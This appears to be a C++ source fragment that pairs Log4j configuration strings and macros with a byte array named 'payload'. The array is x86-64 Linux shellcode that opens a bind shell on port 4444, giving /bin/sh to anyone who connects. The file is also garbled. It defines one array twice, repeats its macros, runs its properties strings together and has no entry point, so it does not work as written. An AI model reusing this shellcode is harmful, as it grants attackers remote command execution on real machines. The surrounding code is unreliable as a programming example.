
#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <dlfcn.h>
#include <pthread.h>
#include <sys/wait.h>

using namespace std;
#define LOG4J_PROPERTIES_RESOURCE_NAME "log4j.properties"
#define LOG4J_CONFIGURATION_RESOURCE_NAME "log4j.xml"
#define LOG4J_CONFIGURATION_OPEN_TAG "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
#define LOG4J_CONFIGURATION_CLOSE_TAG "</log4j:configuration>"
#define LOG4J_PACKAGE "org.apache.log4j"
#define LOG4J_CONFIGURATION_FILE_OPEN_TAG "<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">"
#define LOG4J_CONFIGURATION_FILE_CLOSE_TAG "</log4j:configuration>"
#define LOG4J_CONFIGURATION_FILE_OPEN_TAG_LEN (sizeof(LOG4J_CONFIGURATION_FILE_OPEN_TAG) - 1)
#define LOG4J_CONFIGURATION_FILE_CLOSE_TAG_LEN (sizeof(LOG4J_CONFIGURATION_FILE_CLOSE_TAG) - 1)
#define LOG4J_CONFIGURATION_OPEN_TAG_LEN (sizeof(LOG4J_CONFIGURATION_OPEN_TAG) - 1)
#define LOG4J_CONFIGURATION_CLOSE_TAG_LEN (sizeof(LOG4J_CONFIGURATION_CLOSE_TAG) - 1)
#define LOG4J_PACKAGE_LEN (sizeof(LOG4J_PACKAGE) - 1)
#define LOG4J_PROPERTIES_RESOURCE_NAME_LEN (sizeof(LOG4J_PROPERTIES_RESOURCE_NAME) - 1)
#define LOG4J_CONFIGURATION_RESOURCE_NAME_LEN (sizeof(LOG4J_CONFIGURATION_RESOURCE_NAME) - 1)
#define LOG4J_PROPERTIES_RESOURCE_NAME "log4j.properties"
#define LOG4J_CONFIGURATION_RESOURCE_NAME "log4j.xml"


const char payload[] = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52" \
					   "\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31" \
					   "\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f" \
					   "\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75" \
					   "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" \
					   "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

const char log4j_properties[] = "log4j.rootLogger=INFO,STDOUT,R" \
							   "log4j.appender.STDOUT=org.apache.log4j.ConsoleAppender" \
							   "log4j.appender.STDOUT.layout=org.apache.log4j.PatternLayout" \
							   "log4j.appender.STDOUT.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n";


const char log4j_configuration[] = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" \
								  "<!DOCTYPE log4j:configuration SYSTEM \"log4j.dtd\">" \
								  "<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">" \
								  "<appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">" \
								  "<layout class=\"org.apache.log4j.PatternLayout\">" \
								  "<param name=\"ConversionPattern\" value=\"%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\"/>" \
								  "</layout>" \
								  "</appender>" \
								  "<root>" \
								  "<priority value=\"info\"/>" \
								  "<appender-ref ref=\"STDOUT\"/>" \
								  "</root>" \
								  "</log4j:configuration>";

const char log4j_properties[] = "log4j.rootLogger=INFO,STDOUT,R" \
                                "log4j.appender.STDOUT=org.apache.log4j.ConsoleAppender" \
                                "log4j.appender.STDOUT.layout=org.apache.log4j.PatternLayout" \
                                "log4j.appender.STDOUT.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n";
